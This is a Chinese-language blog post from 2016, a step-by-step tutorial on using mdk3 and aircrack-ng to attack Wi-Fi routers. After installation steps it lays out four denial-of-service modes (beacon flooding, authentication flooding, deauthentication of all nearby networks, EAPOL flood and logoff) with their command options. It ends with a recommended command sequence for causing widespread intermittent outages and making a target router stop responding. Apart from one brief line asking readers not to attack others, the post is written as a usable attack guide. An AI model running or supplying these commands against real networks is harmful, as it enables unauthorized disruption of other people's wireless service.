---
layout: default
title:  "使用mdk3+aircrack-ng攻击路由器"
date:   2016-08-28 11:47
categories: jekyll update
---
>mdk3是一款Linux下的终端网络攻击工具，需要配合强大的aircrack -ng使用  

[mdk3-Github](https://github.com/charlesxsh/mdk3-master)  
[mdk3-Github|LEXUGE's fork](https://github.com/LEXUGE/mdk3-master)  
[aircrack -ng](http://www.aircrack-ng.org/index.html)  

现在mdk3的官网已经关闭了，在Github上还有mdk3 v6的原版改进版，为防止项目被删除，我也fork了一份，供大家备用下载。  
mdk3的攻击过程中是不需要网络连接的，也就是在无网络的状态下攻击，希望大家不要恶意攻击他人，保持好自己的黑客道德。  
教程在Fedora Linux下通过测试  

1. ```iwconfig```  
使用该命令来检查是哪一个接口来支持无线连接的，如我的就是wlp2s0  

2. ```iw dev wlp2s0 scan```  
用这个命令来扫描周围的Wi-Fi信息，SSID为路由器的名称，BSS为路由器的MAC地址**（注意，截至目前，我们不需要安装任何软件）**  

3. ```dnf install aircrack-ng.x86_64```  
现在我们来安装mdk3和aircrack-ng(aircrack-ng可能名称会发生变动，具体请使用```$ dnf search aircrack-ng```搜索软件包)  

4. 
```
cd /mdk3-master
make
sudo make install
```
下载完mdk3并解压完毕后，即可进行编译安装，在```make```时会有gcc的编译警告，忽略即可，不必担心  

5.
```
cd /usr/local/sbin
./mdk3
```
- 如果正确安装就可以看到mdk3输出的帮助  

- 安装过程到此就完毕了  

现在，我们来介绍如何攻击  
```
su
airmon-ng start {你的接口，在第一步中可以找到}
cd /usr/local/sbin
```
第二条命令时，系统会自动关闭冲突进程，在最后会有监听端口，**注意，接下来的mon0就使用监听端口代替**  

第一种模式：  
beacon flood mode：  
     这个模式可以产生大量死亡SSID来充斥无线客户端的无线列表，从而扰乱无线使用者；我们甚至还可以自定义发送死亡SSID的BSSID和ESSID、加密方式（如wep/wpa2）等。  
详细命令如下：  
```
./mdk3 mon0 b 

      -n <ssid>        #自定义ESSID
      -f <filename>            #读取ESSID列表文件
      -v <filename>           #自定义ESSID和BSSID对应列表文件
      -d         #自定义为Ad-Hoc模式
      -w         #自定义为wep模式
      -g           #54Mbit模式
      -t            # WPA TKIP encryption
      -a           #WPA AES encryption
      -m          #读取数据库的mac地址
       -c <chan>                   #自定义信道
       -s <pps>                #发包速率
```

第二种模式：  
Authentication DoS：  
这是一种验证请求攻击模式：在这个模式里，软件自动模拟随机产生的mac向目标AP发起大量验证请求，可以导致AP忙于处理过多的请求而停止对正常连接客户端的响应；这个模式常见的使用是在reaver穷据路由PIN码，当遇到AP被“pin死”时，可以用这个模式来直接让AP停止正常响应，迫使AP主人重启路由！  
```
./mdk3 mon0 a
      -a <ap_mac>              #测试指定BSS
      -m              #使用有效数据库中的客户端mac地址
      -c          #对应 -a ，不检查是否测试成功
      -i  <ap_mac>           #对指定BSS进行智能攻击
      -s <pps>               #速率，默认50
```

第三种模式：  
Deauthentication/Disassociation Amok：  
强制解除验证解除连接！在这个模式下，软件会向周围所有可见AP发起循环攻击......可以造成一定范围内的无线网络瘫痪（当然有白名单，黑名单模式），直到手动停止攻击！  
```
mdk3 mon0 d
      -w <filename>             #白名单mac地址列表文件
      -b <filename>              #黑名单mac地址列表文件
      -s <pps>                        #速率，这个模式下默认无限制
      -c [chan,chan,chan,...]                  #信道，可以多填，如 2,4,5,1
```

第四种模式：  
802.1X test:
```
mdk3 mon0 x  
      0 - EAPOL Start packet flooding   #EAPOL格式的报文洪水攻击

            -n <ssid>               
            -t <bssid>        #目标客户端的mac地址               

            -w <WPA type>
               Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)
            -u <unicast cipher>
               Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
            -m <multicast cipher>
               Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
            -s <pps>      #速率，默认400               
      1 - EAPOL Logoff test       #注销认证攻击
            -t <bssid>        #目标客户端的mac地址             
            -c <bssid>         #目标ap的合法客户端mac               
            -s <pps>         #速率，默认400               
```

最后，建议这样攻击：  
第一种和第三种同时使用会造成大面积间歇性断网，第二种可以配合第四种进行攻击，会导致路由器死亡  
分别是  
```
./mdk3 mon0 b
./mdk3 mon0 d -s 120
./mdk3 mon0 a -a {你要攻击的路由器MAC(BSS)}
./mdk3 mon0 x 1 -c {客户端MAC(虚拟)} -t {路由器MAC(BSS)}
```

祝你成功！
